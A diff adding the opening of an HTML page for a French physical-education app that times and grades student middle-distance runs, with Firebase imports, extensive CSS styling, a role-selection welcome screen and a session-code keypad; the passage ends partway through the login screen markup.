@@ -1,0 +1,1837 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>EPS DEMI-FOND – Évaluation Course</title>
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:ital,wght@0,400;0,600;0,700;0,800;0,900;1,800&family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+
+<!-- Firebase -->
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+
+<style>
+/* ==========================================
+   DESIGN SYSTEM – Sport Dashboard Dark
+   ========================================== */
+:root {
+  --bg:       #080b10;
+  --surface:  #0f1520;
+  --surface2: #161e2e;
+  --surface3: #1e2a3e;
+  --blue:     #1a8cff;
+  --blue-dim: rgba(26,140,255,.15);
+  --orange:   #ff6a10;
+  --green:    #00d47e;
+  --yellow:   #ffc940;
+  --red:      #ff3b3b;
+  --white:    #f0f4ff;
+  --muted:    #8090b0;
+  --border:   rgba(255,255,255,.08);
+  --font-d: 'Barlow Condensed', sans-serif;
+  --font-b: 'DM Sans', sans-serif;
+  --rad: 16px;
+  --rad-sm: 10px;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+html, body {
+  height: 100%; width: 100%;
+  background: var(--bg);
+  color: var(--white);
+  font-family: var(--font-b);
+  font-size: 16px;
+  -webkit-font-smoothing: antialiased;
+  overscroll-behavior: none;
+  overflow: hidden;
+}
+
+/* ==========================================
+   SCREENS
+   ========================================== */
+.screen {
+  position: fixed; inset: 0;
+  display: none; flex-direction: column;
+  overflow-y: auto; overflow-x: hidden;
+  padding: env(safe-area-inset-top, 0px) 0 env(safe-area-inset-bottom, 0px);
+  background: var(--bg);
+  z-index: 1;
+}
+.screen.active { display: flex; }
+
+/* Inner content wrapper */
+.screen-inner {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  padding: 20px 20px 32px;
+  max-width: 480px;
+  width: 100%;
+  margin: 0 auto;
+}
+
+/* ==========================================
+   TOP BAR
+   ========================================== */
+.topbar {
+  display: flex;
+  align-items: center;
+  padding: 14px 20px;
+  border-bottom: 1px solid var(--border);
+  background: var(--surface);
+  position: sticky; top: 0; z-index: 10;
+}
+.topbar-back {
+  width: 40px; height: 40px;
+  display: flex; align-items: center; justify-content: center;
+  background: var(--surface3); border-radius: 50%;
+  border: none; color: var(--white); cursor: pointer; font-size: 20px;
+  margin-right: 12px; flex-shrink: 0;
+}
+.topbar-title {
+  font-family: var(--font-d); font-size: 20px; font-weight: 700;
+  letter-spacing: 0.05em; flex: 1;
+}
+.topbar-badge {
+  background: var(--surface3); border-radius: 8px;
+  padding: 4px 10px; font-size: 13px; color: var(--muted);
+}
+
+/* ==========================================
+   TYPOGRAPHY
+   ========================================== */
+.heading {
+  font-family: var(--font-d); font-size: 32px; font-weight: 800;
+  line-height: 1.1; letter-spacing: 0.02em;
+}
+.heading-sm {
+  font-family: var(--font-d); font-size: 22px; font-weight: 700;
+  letter-spacing: 0.03em;
+}
+.subtext { font-size: 14px; color: var(--muted); line-height: 1.5; }
+.label { font-size: 12px; font-weight: 600; text-transform: uppercase;
+  letter-spacing: 0.08em; color: var(--muted); }
+.value-large {
+  font-family: var(--font-d); font-size: 72px; font-weight: 900;
+  line-height: 1; letter-spacing: -1px;
+}
+
+/* ==========================================
+   BUTTONS
+   ========================================== */
+.btn {
+  display: flex; align-items: center; justify-content: center; gap: 8px;
+  min-height: 56px; padding: 12px 24px; border: none; border-radius: var(--rad);
+  font-family: var(--font-d); font-size: 20px; font-weight: 700;
+  letter-spacing: 0.04em; cursor: pointer; width: 100%;
+  transition: transform .12s, opacity .12s;
+  text-transform: uppercase;
+  -webkit-tap-highlight-color: transparent;
+}
+.btn:active { transform: scale(.97); }
+.btn-primary { background: var(--blue); color: var(--white); }
+.btn-secondary { background: var(--surface3); color: var(--white); border: 1px solid var(--border); }
+.btn-orange { background: var(--orange); color: var(--white); }
+.btn-green { background: var(--green); color: #001a0d; }
+.btn-danger { background: var(--red); color: var(--white); }
+.btn-ghost { background: transparent; color: var(--muted); border: 1px solid var(--border); }
+.btn:disabled { opacity: .4; pointer-events: none; }
+.btn-sm { min-height: 44px; font-size: 16px; padding: 10px 18px; }
+.btn-icon { font-size: 22px; }
+
+/* ==========================================
+   FORM ELEMENTS
+   ========================================== */
+.field { display: flex; flex-direction: column; gap: 6px; margin-bottom: 16px; }
+.field label { font-size: 13px; font-weight: 600; color: var(--muted); text-transform: uppercase; letter-spacing: .06em; }
+.field input, .field select, .field textarea {
+  background: var(--surface2); border: 1px solid var(--border);
+  border-radius: var(--rad-sm); color: var(--white);
+  font-family: var(--font-b); font-size: 18px; padding: 14px 16px;
+  outline: none; width: 100%;
+  transition: border-color .15s;
+  -webkit-appearance: none; appearance: none;
+}
+.field input:focus, .field select:focus, .field textarea:focus {
+  border-color: var(--blue);
+}
+.field input::placeholder { color: var(--muted); }
+.field textarea { resize: none; min-height: 80px; font-size: 15px; }
+
+/* Radio group */
+.radio-group { display: flex; gap: 10px; }
+.radio-opt {
+  flex: 1; min-height: 56px; border-radius: var(--rad-sm);
+  background: var(--surface2); border: 2px solid var(--border);
+  cursor: pointer; display: flex; align-items: center; justify-content: center;
+  font-family: var(--font-d); font-size: 20px; font-weight: 700;
+  transition: border-color .15s, background .15s;
+  -webkit-tap-highlight-color: transparent;
+}
+.radio-opt.selected { border-color: var(--blue); background: var(--blue-dim); color: var(--blue); }
+
+/* Slider */
+.slider-row { display: flex; align-items: center; gap: 14px; }
+.slider-row input[type=range] {
+  flex: 1; -webkit-appearance: none; appearance: none;
+  height: 6px; background: var(--surface3); border-radius: 3px;
+  border: none; padding: 0; cursor: pointer;
+}
+.slider-row input[type=range]::-webkit-slider-thumb {
+  -webkit-appearance: none; width: 24px; height: 24px;
+  border-radius: 50%; background: var(--blue); cursor: pointer;
+  box-shadow: 0 0 0 4px var(--blue-dim);
+}
+.slider-val {
+  font-family: var(--font-d); font-size: 28px; font-weight: 800;
+  min-width: 64px; text-align: center; color: var(--blue);
+}
+
+/* ==========================================
+   CARDS
+   ========================================== */
+.card {
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: var(--rad); padding: 18px;
+  margin-bottom: 12px;
+}
+.card-row {
+  display: flex; align-items: center; justify-content: space-between;
+  margin-bottom: 12px;
+}
+.card-row:last-child { margin-bottom: 0; }
+
+/* Metric tile */
+.metric-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 16px; }
+.metric-tile {
+  background: var(--surface2); border-radius: var(--rad-sm);
+  padding: 14px; border: 1px solid var(--border);
+}
+.metric-tile .label { margin-bottom: 4px; }
+.metric-tile .val {
+  font-family: var(--font-d); font-size: 26px; font-weight: 800;
+}
+
+/* ==========================================
+   ZONE BADGES
+   ========================================== */
+.zone-badge {
+  display: inline-flex; align-items: center; justify-content: center;
+  min-width: 48px; height: 36px; border-radius: 8px;
+  font-family: var(--font-d); font-size: 16px; font-weight: 800;
+  text-transform: uppercase; letter-spacing: .04em;
+}
+.zone-B  { background: #1a8cff22; color: #1a8cff; border: 1px solid #1a8cff66; }
+.zone-J  { background: #ffc94022; color: #ffc940; border: 1px solid #ffc94066; }
+.zone-J- { background: #ffc94022; color: #ffc940; border: 1px solid #ffc94066; }
+.zone-R  { background: #ff6a1022; color: #ff6a10; border: 1px solid #ff6a1066; }
+.zone-R- { background: #ff6a1022; color: #ff6a10; border: 1px solid #ff6a1066; }
+.zone-W  { background: rgba(255,255,255,.08); color: #d0d8f0; border: 1px solid rgba(255,255,255,.2); }
+.zone-W- { background: rgba(255,255,255,.08); color: #d0d8f0; border: 1px solid rgba(255,255,255,.2); }
+.zone-N  { background: #ff3b3b22; color: #ff3b3b; border: 1px solid #ff3b3b66; }
+
+/* ==========================================
+   TIMER DISPLAY
+   ========================================== */
+.timer-ring-wrap {
+  position: relative; width: 220px; height: 220px;
+  margin: 24px auto;
+}
+.timer-ring-wrap svg { position: absolute; inset: 0; transform: rotate(-90deg); }
+.timer-ring-bg { fill: none; stroke: var(--surface3); stroke-width: 10; }
+.timer-ring-fill { fill: none; stroke: var(--blue); stroke-width: 10;
+  stroke-linecap: round; transition: stroke-dashoffset .5s linear;
+}
+.timer-ring-fill.warning { stroke: var(--yellow); }
+.timer-ring-fill.danger { stroke: var(--red); }
+.timer-center {
+  position: absolute; inset: 0;
+  display: flex; flex-direction: column; align-items: center; justify-content: center;
+}
+.timer-display {
+  font-family: var(--font-d); font-size: 52px; font-weight: 900;
+  line-height: 1; letter-spacing: -1px;
+}
+.timer-label { font-size: 12px; font-weight: 600; color: var(--muted); letter-spacing: .1em; text-transform: uppercase; margin-top: 4px; }
+
+/* ==========================================
+   PROGRESS BAR
+   ========================================== */
+.progress-bar {
+  height: 8px; background: var(--surface3); border-radius: 4px;
+  overflow: hidden; margin-bottom: 16px;
+}
+.progress-fill {
+  height: 100%; background: var(--blue); border-radius: 4px;
+  transition: width .3s ease;
+}
+
+/* ==========================================
+   COURSE NUMBER INDICATOR
+   ========================================== */
+.course-dots {
+  display: flex; gap: 8px; justify-content: center; margin-bottom: 20px;
+}
+.course-dot {
+  width: 10px; height: 10px; border-radius: 50%;
+  background: var(--surface3);
+}
+.course-dot.done { background: var(--green); }
+.course-dot.active { background: var(--blue); box-shadow: 0 0 0 3px var(--blue-dim); }
+
+/* ==========================================
+   SPLIT TIMES
+   ========================================== */
+.split-list { display: flex; flex-direction: column; gap: 8px; }
+.split-item {
+  display: flex; align-items: center; gap: 12px;
+  background: var(--surface3); border-radius: 8px; padding: 10px 14px;
+}
+.split-num {
+  font-family: var(--font-d); font-size: 13px; font-weight: 700;
+  color: var(--muted); width: 24px;
+}
+.split-time {
+  font-family: var(--font-d); font-size: 20px; font-weight: 800;
+  color: var(--blue);
+}
+.split-del {
+  margin-left: auto; background: none; border: none; color: var(--red);
+  cursor: pointer; font-size: 18px; padding: 4px;
+}
+
+/* ==========================================
+   LIVE STUDENT LIST (teacher)
+   ========================================== */
+.student-row {
+  display: flex; align-items: center; gap: 12px; padding: 12px 16px;
+  background: var(--surface); border-radius: var(--rad-sm);
+  border: 1px solid var(--border); margin-bottom: 8px;
+}
+.student-avatar {
+  width: 40px; height: 40px; border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  font-family: var(--font-d); font-size: 20px; font-weight: 800;
+  flex-shrink: 0;
+}
+.avatar-M { background: #1a8cff22; color: var(--blue); }
+.avatar-F { background: #ff6a1022; color: var(--orange); }
+.student-info { flex: 1; min-width: 0; }
+.student-name { font-weight: 600; font-size: 15px; }
+.student-meta { font-size: 12px; color: var(--muted); }
+.status-dot {
+  width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0;
+}
+.status-active { background: var(--green); box-shadow: 0 0 0 3px #00d47e22; animation: pulse 2s infinite; }
+.status-idle { background: var(--yellow); }
+.status-away { background: var(--red); }
+
+@keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:.5; } }
+
+/* Distance number picker */
+.num-picker {
+  display: flex; align-items: center; gap: 16px; justify-content: center;
+  margin: 20px 0;
+}
+.num-btn {
+  width: 60px; height: 60px; border-radius: 50%;
+  background: var(--surface3); border: 2px solid var(--border);
+  color: var(--white); font-size: 28px; font-weight: 700;
+  cursor: pointer; display: flex; align-items: center; justify-content: center;
+  -webkit-tap-highlight-color: transparent; transition: background .1s;
+}
+.num-btn:active { background: var(--surface2); }
+.num-display {
+  font-family: var(--font-d); font-size: 64px; font-weight: 900;
+  color: var(--white); min-width: 160px; text-align: center;
+  line-height: 1;
+}
+.num-unit { font-size: 16px; font-weight: 500; color: var(--muted); text-align: center; margin-top: -4px; }
+
+/* Result feedback panel */
+.result-panel {
+  border-radius: var(--rad); padding: 20px; margin: 16px 0;
+  text-align: center;
+}
+.result-panel.blue { background: var(--blue-dim); border: 1px solid #1a8cff44; }
+.result-panel.green { background: #00d47e15; border: 1px solid #00d47e44; }
+.result-panel.yellow { background: #ffc94015; border: 1px solid #ffc94044; }
+.result-panel.red { background: #ff3b3b15; border: 1px solid #ff3b3b44; }
+.result-panel .emoji { font-size: 40px; margin-bottom: 8px; }
+.result-panel .result-title { font-family: var(--font-d); font-size: 28px; font-weight: 800; }
+.result-panel .result-sub { font-size: 14px; color: var(--muted); margin-top: 6px; }
+
+/* Degree rubric */
+.degree-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 16px; }
+.degree-opt {
+  background: var(--surface2); border: 2px solid var(--border);
+  border-radius: var(--rad-sm); padding: 14px 10px; cursor: pointer;
+  text-align: center; transition: border-color .15s, background .15s;
+  -webkit-tap-highlight-color: transparent;
+}
+.degree-opt.selected { border-color: var(--blue); background: var(--blue-dim); }
+.degree-opt .deg-num { font-family: var(--font-d); font-size: 24px; font-weight: 800; color: var(--muted); }
+.degree-opt.selected .deg-num { color: var(--blue); }
+.degree-opt .deg-label { font-size: 11px; color: var(--muted); margin-top: 2px; }
+
+/* Tabs */
+.tabs { display: flex; gap: 6px; background: var(--surface); border-radius: var(--rad-sm);
+  padding: 4px; margin-bottom: 20px; }
+.tab-btn {
+  flex: 1; min-height: 40px; border: none; border-radius: 8px;
+  background: transparent; color: var(--muted); font-family: var(--font-d);
+  font-size: 16px; font-weight: 700; cursor: pointer;
+  transition: background .15s, color .15s;
+}
+.tab-btn.active { background: var(--surface3); color: var(--white); }
+
+/* Toast */
+.toast {
+  position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(100px);
+  background: var(--surface3); border: 1px solid var(--border);
+  border-radius: var(--rad-sm); padding: 12px 20px;
+  font-size: 15px; font-weight: 500; z-index: 1000;
+  transition: transform .3s cubic-bezier(.2,1,.3,1);
+  white-space: nowrap; max-width: 90vw;
+  box-shadow: 0 8px 32px rgba(0,0,0,.5);
+}
+.toast.show { transform: translateX(-50%) translateY(0); }
+.toast.success { border-color: var(--green); }
+.toast.error { border-color: var(--red); }
+
+/* Loading overlay */
+.loading {
+  position: fixed; inset: 0; background: var(--bg);
+  display: flex; align-items: center; justify-content: center;
+  z-index: 100; flex-direction: column; gap: 16px;
+}
+.loading.hidden { display: none; }
+.spinner {
+  width: 48px; height: 48px; border: 3px solid var(--surface3);
+  border-top-color: var(--blue); border-radius: 50%;
+  animation: spin .8s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+@keyframes shake {
+  0%,100% { transform: translateX(0); }
+  20%      { transform: translateX(-10px); }
+  40%      { transform: translateX(10px); }
+  60%      { transform: translateX(-8px); }
+  80%      { transform: translateX(6px); }
+}
+
+/* ==========================================
+   WELCOME SCREEN
+   ========================================== */
+.welcome-bg {
+  position: absolute; inset: 0; overflow: hidden; pointer-events: none;
+}
+.welcome-orb {
+  position: absolute; border-radius: 50%; filter: blur(80px); opacity: .25;
+}
+.orb1 { width: 300px; height: 300px; background: var(--blue); top: -80px; right: -80px; }
+.orb2 { width: 250px; height: 250px; background: var(--orange); bottom: 60px; left: -60px; }
+.welcome-content {
+  position: relative; flex: 1; display: flex; flex-direction: column;
+  align-items: center; justify-content: center; padding: 40px 24px;
+  text-align: center;
+}
+.app-logo {
+  font-family: var(--font-d); font-size: 80px; font-weight: 900;
+  letter-spacing: -3px; line-height: .9; color: var(--white);
+  margin-bottom: 8px;
+}
+.app-logo span { color: var(--blue); }
+.app-tag { font-size: 14px; color: var(--muted); letter-spacing: .1em;
+  text-transform: uppercase; margin-bottom: 48px; }
+
+.role-cards { display: flex; flex-direction: column; gap: 12px; width: 100%; max-width: 360px; }
+.role-card {
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: var(--rad); padding: 20px 24px;
+  display: flex; align-items: center; gap: 16px;
+  cursor: pointer; transition: border-color .15s, transform .12s;
+  -webkit-tap-highlight-color: transparent;
+}
+.role-card:active { transform: scale(.98); }
+.role-card:hover, .role-card:focus { border-color: var(--blue); }
+.role-icon { font-size: 36px; }
+.role-info { text-align: left; }
+.role-title { font-family: var(--font-d); font-size: 22px; font-weight: 800; }
+.role-sub { font-size: 13px; color: var(--muted); margin-top: 2px; }
+.role-arrow { margin-left: auto; color: var(--muted); font-size: 20px; }
+
+/* Security banner */
+.exit-counter {
+  background: var(--red); border-radius: 8px; padding: 6px 14px;
+  font-size: 13px; font-weight: 600; margin: 0 20px 12px;
+  display: flex; align-items: center; gap: 6px;
+}
+.exit-counter.hidden { display: none; }
+
+/* ==========================================
+   SCORE SUMMARY
+   ========================================== */
+.score-grid {
+  display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px;
+  margin-bottom: 20px;
+}
+.score-tile {
+  background: var(--surface2); border-radius: var(--rad-sm);
+  border: 1px solid var(--border); padding: 14px; text-align: center;
+}
+.score-tile .stitle { font-size: 11px; color: var(--muted); text-transform: uppercase;
+  letter-spacing: .07em; margin-bottom: 6px; }
+.score-tile .sval {
+  font-family: var(--font-d); font-size: 36px; font-weight: 900; line-height: 1;
+}
+.score-tile .smax { font-size: 13px; color: var(--muted); }
+.score-total {
+  background: var(--surface2); border-radius: var(--rad);
+  border: 2px solid var(--blue); padding: 20px; text-align: center;
+  margin-bottom: 20px;
+}
+.score-total .t-label { font-size: 13px; color: var(--muted); text-transform: uppercase;
+  letter-spacing: .07em; margin-bottom: 8px; }
+.score-total .t-val {
+  font-family: var(--font-d); font-size: 64px; font-weight: 900; line-height: 1;
+  color: var(--blue);
+}
+.score-total .t-max { font-size: 18px; color: var(--muted); }
+.score-total .t-mention {
+  font-family: var(--font-d); font-size: 18px; font-weight: 700;
+  margin-top: 8px;
+}
+
+/* Course recap row */
+.course-recap {
+  background: var(--surface3); border-radius: 10px; padding: 12px 14px;
+  display: flex; align-items: center; gap: 12px; margin-bottom: 8px;
+}
+.course-recap .cnum {
+  font-family: var(--font-d); font-size: 22px; font-weight: 800;
+  color: var(--muted); width: 28px;
+}
+.course-recap .cinfo { flex: 1; }
+.course-recap .cdist { font-family: var(--font-d); font-size: 20px; font-weight: 800; }
+.course-recap .ctarget { font-size: 12px; color: var(--muted); }
+.course-recap .cscore {
+  font-family: var(--font-d); font-size: 22px; font-weight: 800; color: var(--blue);
+}
+
+/* Teacher session cards */
+.session-card {
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: var(--rad); padding: 18px; margin-bottom: 12px;
+}
+.session-code {
+  font-family: var(--font-d); font-size: 36px; font-weight: 900;
+  letter-spacing: .2em; color: var(--blue);
+}
+.session-meta { font-size: 13px; color: var(--muted); margin-top: 4px; }
+.session-actions { display: flex; gap: 10px; margin-top: 16px; }
+.session-actions .btn { flex: 1; font-size: 15px; min-height: 44px; }
+
+/* Live stats bar */
+.live-bar {
+  display: flex; gap: 8px; margin-bottom: 16px; overflow-x: auto;
+  padding-bottom: 4px;
+}
+.live-stat {
+  background: var(--surface2); border-radius: 8px; padding: 10px 14px;
+  flex-shrink: 0; text-align: center; min-width: 80px;
+}
+.live-stat .ls-val {
+  font-family: var(--font-d); font-size: 28px; font-weight: 900;
+  line-height: 1;
+}
+.live-stat .ls-label { font-size: 11px; color: var(--muted); margin-top: 2px; }
+
+/* Alert banner */
+.alert-banner {
+  background: #ff3b3b18; border: 1px solid #ff3b3b44;
+  border-radius: 10px; padding: 12px 14px; margin-bottom: 12px;
+  display: flex; align-items: center; gap: 10px; font-size: 14px;
+}
+.alert-banner.hidden { display: none; }
+.alert-icon { font-size: 20px; }
+
+/* scrollbar */
+::-webkit-scrollbar { width: 3px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--surface3); border-radius: 2px; }
+
+/* pin code display */
+.pin-display {
+  display: flex; gap: 10px; justify-content: center; margin: 16px 0;
+}
+.pin-char {
+  width: 52px; height: 64px; background: var(--surface2);
+  border: 2px solid var(--border); border-radius: 10px;
+  display: flex; align-items: center; justify-content: center;
+  font-family: var(--font-d); font-size: 32px; font-weight: 900;
+  letter-spacing: 0;
+}
+.pin-char.filled { border-color: var(--blue); color: var(--blue); }
+
+/* numpad */
+.numpad {
+  display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px;
+  max-width: 300px; margin: 0 auto;
+}
+.nk {
+  height: 64px; background: var(--surface2); border: 1px solid var(--border);
+  border-radius: var(--rad-sm); font-family: var(--font-d);
+  font-size: 28px; font-weight: 800; color: var(--white);
+  cursor: pointer; display: flex; align-items: center; justify-content: center;
+  -webkit-tap-highlight-color: transparent; transition: background .1s;
+}
+.nk:active { background: var(--surface3); }
+.nk.del { font-size: 22px; color: var(--muted); }
+.nk.empty { background: transparent; border-color: transparent; pointer-events: none; }
+
+/* group member card */
+.member-card {
+  background: var(--surface2); border: 1px solid var(--border);
+  border-radius: var(--rad-sm); padding: 14px 16px;
+  display: flex; align-items: center; gap: 12px; margin-bottom: 8px;
+}
+.member-num {
+  font-family: var(--font-d); font-size: 26px; font-weight: 800;
+  color: var(--muted); width: 28px;
+}
+.member-info { flex: 1; }
+.member-name { font-weight: 600; font-size: 16px; }
+.member-vma { font-size: 13px; color: var(--muted); }
+.role-tag {
+  font-size: 12px; font-weight: 600; padding: 4px 10px;
+  border-radius: 6px; background: var(--surface3);
+}
+.role-tag.runner { background: var(--blue-dim); color: var(--blue); }
+.role-tag.judge { background: #00d47e15; color: var(--green); }
+
+/* target display */
+.target-circle {
+  width: 160px; height: 160px; border-radius: 50%;
+  border: 3px solid var(--blue); background: var(--blue-dim);
+  display: flex; flex-direction: column; align-items: center; justify-content: center;
+  margin: 24px auto;
+}
+.target-circle .tc-val {
+  font-family: var(--font-d); font-size: 48px; font-weight: 900; line-height: 1;
+  color: var(--blue);
+}
+.target-circle .tc-unit { font-size: 14px; color: var(--muted); margin-top: 2px; }
+.target-circle .tc-sub { font-size: 11px; color: var(--muted); margin-top: 4px; text-transform: uppercase; letter-spacing: .06em; }
+
+/* group code */
+.group-code-display {
+  font-family: var(--font-d); font-size: 42px; font-weight: 900;
+  letter-spacing: .15em; color: var(--blue); text-align: center;
+  background: var(--blue-dim); border: 1px solid #1a8cff44;
+  border-radius: var(--rad-sm); padding: 16px; margin: 12px 0;
+}
+
+/* ==========================================
+   RESPONSIVE
+   ========================================== */
+@media (min-width: 480px) {
+  .screen-inner { padding: 28px 28px 40px; }
+}
+</style>
+</head>
+<body>
+
+<!-- Loading overlay (en arrière-plan, jamais bloquant au démarrage) -->
+<div class="loading hidden" id="loading">
+  <div class="spinner"></div>
+  <div style="font-size:14px;color:var(--muted);">Vérification…</div>
+</div>
+
+<!-- ========================================================
+     TOAST
+     ======================================================== -->
+<div class="toast" id="toast"></div>
+
+<!-- Exit counter banner (visible on all screens when exits > 0) -->
+<div class="exit-counter hidden" id="exitBanner">
+  ⚠️ <span id="exitText">Sortie détectée</span>
+</div>
+
+<!-- ========================================================
+     SCREEN 1 – WELCOME
+     ======================================================== -->
+<div class="screen active" id="s-welcome">
+  <div class="welcome-bg">
+    <div class="welcome-orb orb1"></div>
+    <div class="welcome-orb orb2"></div>
+  </div>
+  <div class="welcome-content">
+    <div class="app-logo">EPS<br><span>DEMI</span><br><span style="color:var(--orange);font-size:52px;">FOND</span></div>
+    <div class="app-tag">3 × 1min30 · Gestion d'allure</div>
+    <div class="role-cards">
+      <div class="role-card" onclick="goStudentLogin()">
+        <span class="role-icon">🏃</span>
+        <div class="role-info">
+          <div class="role-title">Élève</div>
+          <div class="role-sub">Rejoindre une session</div>
+        </div>
+        <span class="role-arrow">›</span>
+      </div>
+      <div class="role-card" onclick="goTeacher()">
+        <span class="role-icon">📋</span>
+        <div class="role-info">
+          <div class="role-title">Enseignant</div>
+          <div class="role-sub">Gérer les sessions</div>
+        </div>
+        <span class="role-arrow">›</span>
+      </div>
+      <div class="role-card" onclick="showScreen('s-bareme')" style="border-color:var(--yellow);opacity:.9;">
+        <span class="role-icon">📊</span>
+        <div class="role-info">
+          <div class="role-title">Barème</div>
+          <div class="role-sub">Consulter les grilles AFL 1/2/3</div>
+        </div>
+        <span class="role-arrow">›</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ========================================================
+     SCREEN 2 – STUDENT SESSION LOGIN
+     ======================================================== -->
+<div class="screen" id="s-student-login">
+  <div class="topbar">
+    <button class="topbar-back" onclick="showScreen('s-welcome')">‹</button>
+    <div class="topbar-title">Espace Élève</div>
+  </div>
+  <div class="screen-inner">
+    <div style="margin-bottom:28px;text-align:center;">
+      <div style="font-size:48px;margin-bottom:8px;">🏃</div>
+      <div class="heading">Code session</div>
+      <div class="subtext" style="margin-top:8px;">
+        Entrez le code fourni<br>par votre enseignant
+      </div>
+    </div>
+
+    <!-- Code display (6 cases) -->
+    <div class="pin-display" id="pinDisplay">
+      <div class="pin-char" id="pc0">·</div>
+      <div class="pin-char" id="pc1">·</div>
+      <div class="pin-char" id="pc2">·</div>
+      <div class="pin-char" id="pc3">·</div>
+      <div class="pin-char" id="pc4">·</div>
+      <div class="pin-char" id="pc5">·</div>
+    </div>
+
+    <!-- Alphanumeric keyboard -->
+    <div style="margin-top:16px;margin-bottom:16px;">
+      <!-- Letters row 1 -->
+      <div style="display:flex;gap:6px;justify-content:center;margin-bottom:6px;">
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('A')">A</div>
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('B')">B</div>
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('C')">C</div>
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('D')">D</div>
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('E')">E</div>
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('F')">F</div>
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('G')">G</div>
+      </div>
+      <!-- Letters row 2 -->
+      <div style="display:flex;gap:6px;justify-content:center;margin-bottom:6px;">
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('H')">H</div>
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('I')">I</div>
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('J')">J</div>
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('K')">K</div>
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('L')">L</div>
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('M')">M</div>
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('N')">N</div>
+      </div>
+      <!-- Letters row 3 -->
+      <div style="display:flex;gap:6px;justify-content:center;margin-bottom:6px;">
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('O')">O</div>
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('P')">P</div>
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('Q')">Q</div>
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('R')">R</div>
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('S')">S</div>
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('T')">T</div>
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('U')">U</div>
+      </div>
+      <!-- Letters row 4 + digits row -->
+      <div style="display:flex;gap:6px;justify-content:center;margin-bottom:6px;">
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('V')">V</div>
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('W')">W</div>
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('X')">X</div>
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('Y')">Y</div>
+        <div class="nk" style="height:46px;font-size:18px;flex:1;max-width:36px;" onclick="pinKey('Z')">Z</div>
+        <div class="nk del" style="height:46px;font-size:18px;flex:2;max-width:78px;" onclick="pinDel()">⌫ Eff.</div>
+      </div>
+      <!-- Digits row -->
+      <div style="display:flex;gap:6px;justify-content:center;">
+        <div class="nk" style="height:46px;font-size:20px;flex:1;" onclick="pinKey('0')">0</div>
+        <div class="nk" style="height:46px;font-size:20px;flex:1;" onclick="pinKey('1')">1</div>
+        <div class="nk" style="height:46px;font-size:20px;flex:1;" onclick="pinKey('2')">2</div>
+        <div class="nk" style="height:46px;font-size:20px;flex:1;" onclick="pinKey('3')">3</div>
+        <div class="nk" style="height:46px;font-size:20px;flex:1;" onclick="pinKey('4')">4</div>
+        <div class="nk" style="height:46px;font-size:20px;flex:1;" onclick="pinKey('5')">5</div>
+        <div class="nk" style="height:46px;font-size:20px;flex:1;" onclick="pinKey('6')">6</div>
+        <div class="nk" style="height:46px;font-size:20px;flex:1;" onclick="pinKey('7')">7</div>
+        <div class="nk" style="height:46px;font-size:20px;flex:1;" onclick="pinKey('8')">8</div>
+        <div class="nk" style="height:46px;font-size:20px;flex:1;" onclick="pinKey('9')">9</div>
+      </div>
+    </div>
+
+    <!-- Erreur code invalide -->
+    <div id="pin-error" style="display:none;background:#ff3b3b18;border:1px solid #ff3b3b55;
+      border-radius:10px;padding:12px 16px;text-align:center;margin-bottom:16px;">
